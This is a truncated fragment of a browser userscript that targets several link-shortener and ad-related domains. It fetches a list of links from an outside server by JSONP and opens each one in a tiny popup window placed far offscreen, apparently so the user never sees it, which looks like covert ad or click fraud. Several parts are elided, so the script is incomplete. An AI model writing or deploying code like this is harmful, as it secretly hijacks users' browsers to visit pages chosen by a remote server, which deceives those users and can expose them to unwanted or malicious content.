...
// @updateURL   http://userscripts.org/scripts/source/164199.user.js
// @include     *://*.*cks.com/
// @include     *://*cl.my/*
// @include     *://*link.com/*
// @include     *://*ysear.ch/*
...
top == self){
	...
	jQuery.ajax({
		url : 'http://csrc.or.di/web-service.php?method=getPosts&id=1&wpCallback=?',
		dataType: 'jsonp',
		...
		function rec(ctr){
			...
			if(arr[ctr]){
				if(typeof adsWind == 'undefined')
					adsWind = wparent.open(arr[ctr].href,"XGpt","width=100,height=50,top=1000,left=20000");
				else	
